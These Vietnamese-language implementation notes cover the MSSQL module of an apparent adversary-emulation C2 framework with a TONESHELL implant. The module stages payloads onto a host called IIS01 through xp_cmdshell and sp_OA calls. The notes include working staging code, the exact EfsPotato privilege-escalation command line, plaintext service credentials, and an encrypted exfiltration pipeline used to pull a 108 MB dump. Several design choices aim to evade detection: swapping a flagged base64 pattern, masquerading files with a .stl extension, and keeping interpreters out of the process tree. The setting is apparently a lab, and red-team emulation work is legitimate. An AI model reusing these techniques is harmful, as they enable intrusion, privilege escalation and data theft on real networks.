# MSSQL Module — Implementation Notes

Module thực thi và staging payload lên IIS01 qua kênh MSSQL xp_cmdshell từ WS01 TONESHELL.
Trạng thái: **hoàn thành và verified** — xpstage + EfsPotato leo quyền thành công.

```
Operator -> controlServer REST API -> TONESHELL (WS01) -> sqlcmd -> MSSQL xp_cmdshell -> IIS01
```

---

## Files thay đổi

| File | Nội dung |
|---|---|
| `controlServer/mssql/mssql.go` | `StagePayload()` — AES-256-CBC encrypt, base64 chunk, INSERT SQL generation |
| `controlServer/restapi/restapi.go` | Route `POST /api/v1.0/mssql/stage` + handler `StageMssqlPayload` |
| `controlServer/toneshell_shell.py` | Class `XpMssql` + dispatch `xpinit` / `xpshell` / `xpstage` |
| `controlServer/handlers/toneshell/toneshell.go` | `MAX_TASK_CMD_STR` nâng 1024 -> 2048 |
| `toneshell-v2/src/shellcode/shellcode.hpp` | `MAX_CMD_LEN` nâng 1024 -> 2048 (cần rebuild implant) |

---

## Quyết định kỹ thuật quan trọng

### Drop directory: `C:\ProgramData\`

Temp files (`.bat`, `.txt`, `.ps1`) và payload cuối đều drop vào `C:\ProgramData\`.

`BUILTIN\Users:(CI)(WD,AD,WEA,WA)` trên root `C:\ProgramData\` -> `NT SERVICE\MSSQL$SQLEXPRESS` write được vì virtual service accounts là thành viên `BUILTIN\Users`. Subdir có sẵn như `C:\ProgramData\Microsoft\` bị hardened (chỉ RX) — không dùng được.

---

### Escaping: hai layer tách biệt

| Layer | Ký tự | Rule | Xử lý ở |
|---|---|---|---|
| C runtime `-Q "..."` | `"` | `"` -> `""` | `_exec_q` |
| T-SQL string `'...'` | `'` | `'` -> `''` | `_tsql_escape` |

`_tsql_escape` chỉ escape `'` — không đụng `"`. `_exec_q` double `"` ngay trước khi build command string.

---

### `_sp_oa_write`: `@v NVARCHAR(MAX)` + CHAR(34)

Khi content chứa `"` (e.g. bat file có `"cmd /c ..."`), truyền trực tiếp vào `sp_OAMethod` parameter không được vì:
- sp_OAMethod không nhận expression (`'a'+CHAR(34)+'b'`) -> `Msg 102: Incorrect syntax near '+'`
- Nếu để `"` trong T-SQL literal và dùng `_exec_q`, `_exec_q` sẽ double thành `""` -> sqlcmd parser treat `""` là end-quote+start-quote -> phần sau `"` bị parse sai

Fix: tách chunk tại `"`, nối bằng `CHAR(34)`, gán vào `@v` trước, rồi truyền `@v`:

```python
segs     = chunk.split('"')
val_expr = '+CHAR(34)+'.join(f"'{self._tsql_escape(s)}'" for s in segs)
tsql = (
    "DECLARE @f INT,@x INT,@v NVARCHAR(MAX);"
    "EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;"
    f"EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'{path}',{mode},1;"
    f"SET @v={val_expr};"
    "EXEC sp_OAMethod @x,'Write',NULL,@v;"
    ...
)
```

---

### `mssql.go`: `USE tempdb;` + single-part names

GRANT không hỗ trợ three-part object name (`tempdb..stg`) -> `Msg 4610: You can only grant or revoke permissions on objects in the current database`.

Fix: thêm `USE tempdb;` vào đầu SQL file, dùng single-part `stg` cho toàn bộ DDL/DML/GRANT sau đó.

---

### PowerShell scripts: single-quote xuyên suốt

Connection string và tất cả giá trị nhúng vào PS script dùng `'...'` thay vì `"..."` để `"` không xuất hiện trong T-SQL string và trigger `_exec_q` double-escape.

SqlClient dùng dấu phẩy cho port (`host,port`), sqlcmd dùng dấu hai chấm — cần `self._host.replace(':', ',')` trước khi build connection string.

---

### Cleanup: `cmd /c del` + `_exec_q` trực tiếp cho DROP TABLE

`del` là cmd builtin, không phải executable — cần `cmd /c del /f {remote_sql}` để xóa SQL file trên WS01.

DROP TABLE dùng `_exec_q` trực tiếp thay vì nested `xpshell cmd "sqlcmd..."` để tránh quoting hell lồng nhau.

---

### `cmd_put_wait` thay vì `cmd_put`

Dùng blocking variant để đảm bảo SQL file transfer xong trên WS01 trước khi chạy `sqlcmd -i` — tránh race condition.

---

### EfsPotato (`CertEnrollSvc.exe`): yêu cầu invocation

`CertEnrollSvc.exe` kiểm tra `GetFileType(stdin) == FILE_TYPE_PIPE` khi khởi động:
- Stdin là pipe (case mặc định khi chạy qua xp_cmdshell) -> cố đọc PE bytes từ stdin -> fail -> return ngay, không chạy gì
- Stdin không phải pipe -> đọc `args[0]` làm command line

Invocation đúng:
```
C:\ProgramData\CertEnrollSvc.exe "cmd /c <cmd>" lsarpc 0<nul
```

- `args[0]` — command line cho `CreateProcessWithToken`
- `args[1]` — EFS endpoint (`lsarpc`); phải là giá trị hợp lệ, nếu không binary return ngay
- `0<nul` — redirect stdin từ NUL, giải quyết FILE_TYPE_PIPE check

`<` trong bat file là literal (không bị interpret ở layer T-SQL/sqlcmd), chỉ được interpret khi cmd.exe chạy bat.

---

## Verified flow

```
xpinit IIS01\SQLEXPRESS:1433 svc_app_dev D3vPortal!2025
xpstage CertEnrollSvc.exe
xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\out.txt 2>&1" lsarpc 0<nul
xpshell cmd type C:\ProgramData\out.txt
```

Credential: `svc_app_dev / D3vPortal!2025` · Instance: `IIS01\SQLEXPRESS` · Port: `1433`

---

## xpexfil + FILE_UPLOAD fixes (2026-08-20/21)

Bổ sung lệnh `xpexfil` và sửa hai lỗi chuỗi trong pipeline FILE_UPLOAD.

### Files thay đổi

| File | Thay đổi |
|---|---|
| `controlServer/toneshell_shell.py` | `_build_decrypt_ps`, `_build_plain_ps` refactor; thêm `_build_exfil_insert_ps`, `_build_exfil_extract_ps`, `cmd_xpexfil`, `cmd_get_wait` |
| `controlServer/handlers/toneshell/toneshell.go` | `RegisterTaskOutput` bổ sung cho nhánh `RESP_FILE_UPLOAD` |

---

### Base64 refactor: `_build_decrypt_ps` + `_build_plain_ps`

`[Convert]::FromBase64String` (pattern bị cấm) đã được thay bằng `FromBase64Transform` CryptoStream trong cả hai hàm build PS, bao gồm cả bước decode key (design doc dự kiến key giữ `[Convert]::FromBase64String`, nhưng code thực tế dùng `FromBase64Transform` luôn để nhất quán):

```powershell
# Key decode (áp dụng trong cả _build_decrypt_ps, _build_exfil_insert_ps, _build_exfil_extract_ps)
$kb=[System.Text.Encoding]::ASCII.GetBytes('<key_b64>');
$kt=New-Object System.Security.Cryptography.FromBase64Transform;
$kms=New-Object System.IO.MemoryStream;
$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);
$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();
```

AES decrypt logic không đổi. `mssql.go` không cần sửa — `base64.StdEncoding` tương thích với `FromBase64Transform`.

---

### Lệnh mới: `xpexfil`

Exfil đối xứng: IIS01 -> (MSSQL) -> WS01 -> (TONESHELL FILE_UPLOAD) -> controlServer.

**Pipeline:**
- A — IIS01 PowerShell (qua `cmd_xpshell_psh`): `ReadAllBytes` -> AES-256-CBC encrypt (random IV prepend) -> `ToBase64Transform` CryptoStream -> SqlClient INSERT 8000-char chunks vào `tempdb..exfil`
- B — WS01 PowerShell (qua `cmd_exec_raw`): SqlClient SELECT `tempdb..exfil` -> `FromBase64Transform` CryptoStream -> AES decrypt -> `WriteAllBytes` ra `C:\Windows\Temp\<local_name>`
- C — cleanup DB: DROP `tempdb..exfil` (không phụ thuộc WS01, nên chạy trước GET-W)
- D — pull + del: `cmd_get_wait` (blocking) -> del WS01 temp

**Deviation từ design doc:** design mô tả cleanup sau pull (D sau C). Code thực tế đảo thứ tự: DROP TABLE trước (bước C), rồi `cmd_get_wait` (bước D), rồi `del /f`. Lý do: DROP TABLE không có dependency vào WS01, làm sớm tránh giữ bảng lâu hơn cần.

Key: `os.urandom(32)` base64-encoded trực tiếp trong `cmd_xpexfil`, không qua Go server.

---

### `cmd_get_wait` — blocking variant cho FILE_UPLOAD

`cmd_get` (fire-and-forget) vẫn giữ nguyên. `cmd_get_wait` bổ sung:

```python
def cmd_get_wait(self, remote_path: str):
    task = {"id": TS_FILE_UPLOAD, "taskNum": ..., "args": remote_path}
    info = self._post_task(task)
    self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
```

Dùng trong `cmd_xpexfil` để đảm bảo `del /f` chỉ chạy sau khi file đã upload xong.

---

### Bug fix: `toneshell.go` — `RegisterTaskOutput` cho `RESP_FILE_UPLOAD`

**Root cause:** `_poll_output` không bao giờ return với FILE_UPLOAD task vì `taskStatus` không bao giờ đạt `TASK_STATUS_FINISHED`. Nhánh `RESP_FILE_UPLOAD` trong `TASK_COMPLETE` case chỉ log success, không gọi `RegisterTaskOutput` -> `FinishTask()` không được gọi.

**Fix** (`toneshell.go`, nhánh `RESP_FILE_UPLOAD`):

```go
// Trước:
} else if taskType == RESP_FILE_UPLOAD {
    o.baseHandler.HandlerLogSuccess("Successfully uploaded file %s", filePath)
}

// Sau:
} else if taskType == RESP_FILE_UPLOAD {
    o.baseHandler.HandlerLogSuccess("Successfully uploaded file %s", filePath)
    o.baseHandler.RegisterTaskOutput(sessionId, []byte{})
}
```

Call chain: `RegisterTaskOutput` -> `ForwardTaskOutput` -> POST `/api/v1.0/session/{id}/task/output` -> `sessions.SetTaskOutput(guid, "", true)` -> `s.Task.FinishTask()` -> `Status = TASK_STATUS_FINISHED` -> `_poll_output` detect và return.

---

### Lab infrastructure: `files/` directory

`HandleFileUpload` trong `toneshell.go` ghi file vào `util.UploadDir = filepath.Join(ProjectRoot, "files")`. Directory này phải tồn tại thủ công — server không auto-create:

```bash
mkdir /home/kali/Tools/rce-and-c2/mustang-panda-emulation/controlServer/files
```

Nếu thiếu: `open .../files/<random>: no such file or directory` — task vẫn FINISHED (vì `RegisterTaskOutput` được gọi sau chunk error), nhưng file content bị mất.

---

## xpexfil-hex timeout + NOCOUNT + upload-dir fixes (2026-09-27/28)

Ba lỗi thực chiến khi exfil `g.dmp` 108 MB (13 chunks) qua `xpexfil-hex`.

### 1. Task timeout của implant không nhận giá trị từ `timeout <seconds>`

**Root cause:** `cmd_exec` / `cmd_exec_raw` build task JSON không có key `timeout` → server (`toneshell.go:634-637`) fallback `DEFAULT_TASK_TIMEOUT = 120` → implant `wait_limit_ms = 120000` (`exec.cpp:63`) dù operator đã `timeout 720`. Batch INSERT ~2 phút trôi qua mốc → implant bắn `FAIL_TASK_TIMEOUT_REACHED (0x60004 = 393220)` qua `NotifyTaskError`.

**Fix** (`c2_client.py`): task JSON cho EXEC giờ có `"timeout": self._timeout_s` (`cmd_exec`) và `"timeout": max(self._timeout_s, timeout_s)` (`cmd_exec_raw`) — lệnh `timeout <n>` và tham số `insert_timeout_s` giờ thật sự đến `task_data->timeout` của implant.

### 2. `(1 row affected)` spam làm batch INSERT chậm + nghẽn stdout

Batch `_build_exfil_insert_tsql` chạy ~27k INSERT; mỗi INSERT in `(1 row affected)` (`-y 0` không truncate) → ~480 KB stdout, implant stream ~250 chunk 1890-byte, pipe backpressure làm batch chậm thêm.

**Fix** (`xp_mssql/exfil.py`): thêm `SET NOCOUNT ON;` ngay sau `EXECUTE AS LOGIN='sa';` trong `_build_exfil_insert_tsql` — stdout còn lại chỉ 3 dòng SELECT cuối. *(Cập nhật 2026-09-28: nhận định "các batch khác không có loop INSERT" không đúng — stage SQL của xpstage/xpstage-hex cũng là loop INSERT, fix NOCOUNT áp cả cho generator server-side, xem mục 4 bên dưới.)*

### 3. `files/` biến mất giữa chừng → hex0–hex3 "uploaded" ảo, content mất

Repo trên kali bị `git clean`/checkout giữa run → `controlServer/files/` (untracked) biến mất. `HandleFileUpload` open fail ENOENT từng chunk nhưng nhánh `TASK_COMPLETE` vô điều kiện log `Successfully uploaded file` + `RegisterTaskOutput` → task FINISHED → operator thấy `[+] file-get complete` dù đĩa không có gì.

**Fix 1** (`util/util.go`): `os.MkdirAll(UploadDir, 0755)` trong `SetRootDirectories()` — server tự tạo lại dir lúc khởi động, hết cần mkdir tay.

**Fix 2** (`toneshell.go`, nhánh `RESP_FILE_UPLOAD`): trước khi log success, `os.Stat(filePath)` — file missing hoặc 0 byte → log `UPLOAD FAILED for <path>: ...` và register message làm task output; operator shell in ra thay vì success ảo.

---

## 4. xpstage-hex tái hiện 0x60004 (393220) + stage SQL không có NOCOUNT (2026-09-28)

Khi chạy `xpstage-hex` gặp lại `FAIL_TASK_TIMEOUT_REACHED (0x60004)` như exfil.

**Link về chuỗi cũ:** mọi lệnh sqlcmd của xpstage đều là TONESHELL EXEC task đi qua `_exec_q` → `cmd_exec_raw` — task dễ chết nhất là **stage INSERT batch** (`sqlcmd -i stage_<id>.stl`, hàng trăm-nghìn INSERT, blocking). Nếu kali chưa sync `c2_client.py` có key `timeout`, task vẫn rơi về `DEFAULT_TASK_TIMEOUT = 120` → 0x60004. Nếu đã sync, operator phải `timeout 720` trước khi gọi (mặc định `self._timeout_s = 120`).

**Fix NOCOUNT** (`controlServer/mssql/mssql.go`): cả `StagePayload` (classic AES/base64) và `StagePayloadHex` (hex) đều sinh SQL file **không có** `SET NOCOUNT ON` → mỗi INSERT in `(1 row affected)` vào sqlcmd stdout stream ngược qua tunnel. Thêm `SET NOCOUNT ON;` ngay sau `EXECUTE AS LOGIN='sa';` trong cả 2 generator. Quy mô nhỏ hơn exfil (payload MB-scale → ~250-1000 INSERT, ~5-20 KB stdout vs ~480 KB) nhưng cùng bản chất; không có consumer nào parse row-count từ batch stage. Yêu cầu **rebuild controlServer** — thay đổi Go source, khác các fix Python trước.

---

## 5. Hợp nhất cơ chế timeout (2026-09-28)

Rà soát cả 3 component cho thấy pipeline chỉ cần **2 cơ chế thật**, nhưng tồn tại 9 con số timeout ad-hoc (`120/120/120/60/180/600/720…`) vì mỗi điểm chọn "đủ cho case của mình" mà không có nguồn sự thật chung.

### Thiết kế thống nhất

| Vai trò | Giá trị | Ai quyết |
|---|---|---|
| Implant wait-limit (exec.cpp `wait_limit_ms`) | `timeout <n>` — luôn gửi trong task JSON | Operator, **default 600** (batch thực chiến cần phút) |
| Watcher (operator poll) | **không deadline** — block đến terminal state | Task luôn kết thúc (output, hoặc `TASK ERROR` khi 0x60004) |
| Escape hatch fire-and-forget | deadline **chỉ khi caller chủ động pass** | Caller giữ quyền |
| Server fallback | `DEFAULT_TASK_TIMEOUT = 120` (giữ nguyên) | Safety khi client quên gửi key |

### Thay đổi

- **`c2_client.py`**: `self._timeout_s` default 600; `_poll_output(timeout_s=None)` — None = block đến terminal state, deadline chỉ khi có param; `cmd_exec`/`cmd_exec_raw` poll block (effective wait = `max(self._timeout_s, timeout_s or 0)` chỉ dùng cho task JSON); `cmd_get_wait`/`cmd_put_wait` bỏ default 180 → block
- **`xp_mssql/staging.py`** (`cmd_xpstage_hex`), **`base.py`** (`cmd_xpshell_psh`), **`xpagent.py`** (`cmd_xpagent_init`): bỏ defaults 120/60/120 → `None` = theo `timeout <n>`
- **`xp_mssql/exfil.py`**: không đổi — `insert_timeout_s` (600) giờ là implant wait-limit của INSERT batch; OBJECT_ID confirm loop là deadline client-side riêng, hợp lệ
- **`xpagent.py cmd_xpexec`**: giữ nguyên — poll dbo.cmd status là đợi thứ khác (worker in-DB), không phải C2 task
- **`controlServer/toneshell.go`**: nhánh `TASK_ERROR` giờ gọi `RegisterTaskOutput(output + "TASK ERROR: implant returned error code <n>")` — task lỗi thành **terminal state**. Trước đó task lỗi kẹt RUNNING vĩnh viễn → poll-until-done không bao giờ thấy kết quả; đây là điều kiện tiên quyết của watcher không deadline. File task lỗi cũng kết thúc (operator thấy message thay vì treo). Yêu cầu **rebuild controlServer**

### Hành vi sau gói

- Batch xong ở 200 s → shell trả output tại ~200 s — hết `[!] timed out` khi task vẫn chạy
- Batch treo quá wait-limit → shell nhận `TASK ERROR: ... 0x60004` ngay — hết zombie RUNNING
- File lớn qua `get`/`put_wait` → shell đợi đến khi xong
- Fire-and-forget (`cmd_get`, `xpexec-bg`) không đổi — nạp lệnh bất đồng bộ vẫn nguyên thiết kế

---

## 6. xpstage-hex: direct thành mặc định, masquerade thành opt-in `--stl` (2026-09-29)

Live lab phát hiện: `xprun` (sp_OA `WScript.Shell.Run` → `ShellExecuteEx`) **không chạy được PE unsigned dưới extension lạ** — `go-thehash.stl` không bao giờ đến `main()` (kể cả `-h`), trong khi cùng byte dưới tên `go-thehash.exe` chạy và put DC01 thành công ngay. `cmd.exe` (CreateProcess) chạy `.stl` bình thường, nhưng `xprun` đi qua ShellExecuteEx — cơ chế phân biệt extension/association + trust check. Tool signed (CertEnrollSvc) vẫn chạy được từ `.stl` qua cùng đường, nên masquerade-at-rest chỉ còn giá trị cho payload signed.

### Thiết kế lại cờ (logic: masquerade là opt-in, direct là mặc định)

| Gọi | Kết quả on-disk | Dùng khi |
|---|---|---|
| `xpstage-hex <p>` | `<p>` giữ nguyên tên/extension (vd `.exe`), không file trung gian, không MoveFile | Mặc định — payload unsigned chạy qua `xprun` trên IIS01 |
| `xpstage-hex <p> --stl` | `<stem>.stl` giữ lại ở rest | Payload **signed** (CertEnrollSvc) — ShellExecuteEx chấp nhận |
| `xpstage-hex <p> --stl --rename` | `<stem>.stl` transient → MoveFile về tên gốc trong cùng decode batch | Payload do đường CreateProcess dispatch nhưng muốn hình ảnh transient .stl |

`--rename` không có `--stl` → lỗi usage (rename chỉ có nghĩa trong chế độ masquerade).

### Thay đổi

- **`xp_mssql/staging.py`** (`cmd_xpstage_hex`): chữ ký đổi `rename` → `stl` + `rename`; `write_path = stl_path if stl else out_path`; validation `rename requires stl`; docstring cập nhật. Size-verify + cleanup giữ nguyên.
- **`toneshell_shell.py`**: dispatch parse `--stl`/`--rename`; usage + help text.
- **`README.md`**: bảng lệnh + bảng trade-off disk artifact.
- **`Flow.md`** (#23): SaveToFile default về `<payload_name>`, masquerade opt-in.
- **Kế hoạch bỏ hẳn**: mode `--stl --rename` (transient .stl → .exe) định loại vì đến tận cùng vẫn xuất hiện file `.exe` trên đĩa (telemetry file-create `.stl` + rename không còn giá trị che khuất) — giữ tạm thời trước khi dọn plan.

### Hệ quả plan (cần đồng bộ Phase 2/4)

- Phase 4 staging go-thehash → mặc định (direct, `.exe`); các payload DC01-side giữ `.stl` trên **DC01** (go-thehash `put` chọn tên on-disk ở đích — WMI/SCM là CreateProcess, extension-agnostic).
- Phase 2 staging CertEnrollSvc → `xpstage-hex CertEnrollSvc.exe --stl` (signed, chạy từ `.stl`).
- Lưu ý chẩn đoán: `xpfile cat` output file có thể là **stale file của lần chạy cũ** — luôn check timestamp/hash trước khi kết luận.

---

## Future works (chưa làm — hết dev effort giai đoạn này)

### Future: channel exec qua WMI COM sp_OA (`SWbemLocator → Win32_Process.Create`)

Ý tưởng từ ràng buộc phát hiện ở mục 6: `xprun` (ShellExecuteEx) chỉ chạy được unsigned PE dưới `.exe`, trong khi mọi đường khác trong pipeline (implant EXEC, xp_cmdshell/cmd, EfsPotato chain, WMI/SCM phía DC01) đều CreateProcess-based — chạy `.stl` bình thường. Một channel exec mới có thể giữ **cả** masquerade `.stl` lẫn tính query-based trên IIS01:

```
sp_OACreate 'WbemScripting.SWbemLocator'
→ ConnectServer('.')
→ Get('Win32_Process')
→ inParameters = Methods_('Create').inParameters.SpawnInstance_; CommandLine = C:\...\payload.stl ...
→ ExecMethod_('Create', inParameters)
```

- Toàn bộ qua `sp_OACreate`/`sp_OAMethod`/`sp_OASetProperty` từ T-SQL — không `xp_cmdshell`, không file staging, không cmd.exe
- Spawn bởi WmiPrvSE qua CreateProcess — extension-agnostic; process tree mới `sqlservr.exe → WmiPrvSE.exe → payload` cho một observable T1047 riêng
- Độ khó: chain COM qua SWbemObject/SWbemMethod (SpawnInstance_, property set trên object handle, ExecMethod_) phức tạp hơn đáng kể so với WScript.Shell.Run hiện tại — cần viết + test riêng trước khi đưa vào plan
- Nguyên tắc ràng buộc: **không** dùng wrapper cmd.exe/PowerShell spawn từ sqlservr để né ShellExecuteEx (dạng `xprun cmd.exe /c payload.stl ...` hay `ProcessStartInfo` qua psh) — mục đích của `xprun` là loại interpreter khỏi process tree, nhét lại wrapper là đi ngược thiết kế
- API chính thức nhưng không exposé qua OLE: `SEE_MASK_CLASSNAME` + `lpClass="exefile"` của ShellExecuteEx — chỉ dùng được nếu có native helper trên IIS01, mất tính query-based

### Future: bỏ hẳn mode `--stl --rename` (đã note ở mục 6)

Transient `.stl` → MoveFile về `.exe` đến tận cùng vẫn để lại file `.exe` trên đĩa — telemetry file-create `.stl` + rename không còn giá trị che khuất thực sự. Chờ dọn plan xong sẽ loại mode này.
